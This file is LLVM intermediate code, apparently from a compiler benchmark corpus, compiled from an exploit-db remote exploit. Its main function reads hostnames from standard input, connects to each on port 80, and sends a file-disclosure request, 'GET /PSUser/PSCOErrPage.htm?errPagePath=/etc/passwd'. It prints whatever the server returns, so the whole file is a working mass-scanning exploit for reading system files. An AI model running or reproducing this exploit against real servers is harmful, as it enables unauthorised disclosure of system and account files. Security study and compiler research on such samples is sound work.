; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_20966.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_20966.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32* }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.rmpMessage = private unnamed_addr constant [53 x i8] c"GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd\0A\00", align 16
@stdin = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@Call = common dso_local global i32 0, align 4
@FLAG = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [100 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [8097 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.hostent*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.in_addr, align 4
  %19 = alloca [53 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = bitcast [53 x i8]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %20, i8* align 16 getelementptr inbounds ([53 x i8], [53 x i8]* @__const.main.rmpMessage, i32 0, i32 0), i64 53, i1 false)
  br label %21

21:                                               ; preds = %105, %2
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %23 = load i32, i32* @stdin, align 4
  %24 = call i64 @fgets(i8* %22, i32 100, i32 %23)
  %25 = icmp ne i64 %24, 0
  br i1 %25, label %26, label %108

26:                                               ; preds = %21
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %28 = load i8, i8* %27, align 16
  %29 = sext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %32

31:                                               ; preds = %26
  br label %108

32:                                               ; preds = %26
  %33 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %34 = call i32 @strlen(i8* %33)
  %35 = sub nsw i32 %34, 1
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %40 = call i32 @strlen(i8* %39)
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 1
  %43 = trunc i64 %42 to i32
  %44 = call i32 @write(i32 1, i8* %38, i32 %43)
  %45 = call i32 @write(i32 1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 1)
  %46 = load i32, i32* @AF_INET, align 4
  %47 = load i32, i32* @SOCK_STREAM, align 4
  %48 = call i32 @socket(i32 %46, i32 %47, i32 0)
  store i32 %48, i32* %10, align 4
  %49 = call i32 @memset(%struct.sockaddr_in* %17, i32 0, i32 12)
  %50 = load i32, i32* @AF_INET, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  store i32 %50, i32* %51, align 4
  %52 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %53 = call %struct.hostent* @gethostbyname(i8* %52)
  store %struct.hostent* %53, %struct.hostent** %16, align 8
  %54 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  %55 = load %struct.hostent*, %struct.hostent** %16, align 8
  %56 = getelementptr inbounds %struct.hostent, %struct.hostent* %55, i32 0, i32 0
  %57 = load i32*, i32** %56, align 8
  %58 = getelementptr inbounds i32, i32* %57, i64 0
  %59 = load i32, i32* %58, align 4
  %60 = call i64 @memcpy(i32* %54, i32 %59, i32 4)
  %61 = inttoptr i64 %60 to i8*
  %62 = getelementptr inbounds [100 x i8], [100 x i8]* %6, i64 0, i64 0
  %63 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  %65 = call i32 @inet_ntoa(i32 %64)
  %66 = call i32 @strcpy(i8* %62, i32 %65)
  %67 = getelementptr inbounds [100 x i8], [100 x i8]* %6, i64 0, i64 0
  %68 = call i32 @inet_addr(i8* %67)
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  store i32 %68, i32* %70, align 4
  %71 = call i32 @htons(i32 80)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i32 %71, i32* %72, align 4
  %73 = load i32, i32* @SIGALRM, align 4
  %74 = load i32, i32* @Call, align 4
  %75 = call i32 @signal(i32 %73, i32 %74)
  store i32 1, i32* @FLAG, align 4
  %76 = call i32 @alarm(i32 10)
  %77 = load i32, i32* %10, align 4
  %78 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %79 = call i32 @connect(i32 %77, %struct.sockaddr* %78, i32 12)
  store i32 %79, i32* %13, align 4
  %80 = call i32 @alarm(i32 0)
  %81 = load i32, i32* @FLAG, align 4
  %82 = icmp eq i32 %81, 1
  br i1 %82, label %83, label %105

83:                                               ; preds = %32
  %84 = load i32, i32* %13, align 4
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %105

86:                                               ; preds = %83
  %87 = load i32, i32* %10, align 4
  %88 = getelementptr inbounds [53 x i8], [53 x i8]* %19, i64 0, i64 0
  %89 = getelementptr inbounds [53 x i8], [53 x i8]* %19, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = sext i32 %90 to i64
  %92 = mul i64 %91, 1
  %93 = trunc i64 %92 to i32
  %94 = call i32 @write(i32 %87, i8* %88, i32 %93)
  br label %95

95:                                               ; preds = %100, %86
  %96 = load i32, i32* %10, align 4
  %97 = getelementptr inbounds [8097 x i8], [8097 x i8]* %9, i64 0, i64 0
  %98 = call i32 @read(i32 %96, i8* %97, i32 8096)
  store i32 %98, i32* %13, align 4
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %100, label %104

100:                                              ; preds = %95
  %101 = getelementptr inbounds [8097 x i8], [8097 x i8]* %9, i64 0, i64 0
  %102 = load i32, i32* %13, align 4
  %103 = call i32 @write(i32 1, i8* %101, i32 %102)
  br label %95

104:                                              ; preds = %95
  br label %105

105:                                              ; preds = %104, %83, %32
  %106 = load i32, i32* %10, align 4
  %107 = call i32 @close(i32 %106)
  br label %21

108:                                              ; preds = %31, %21
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @fgets(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i64 @memcpy(i32*, i32, i32) #2

declare dso_local i32 @strcpy(i8*, i32) #2

declare dso_local i32 @inet_ntoa(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @signal(i32, i32) #2

declare dso_local i32 @alarm(i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
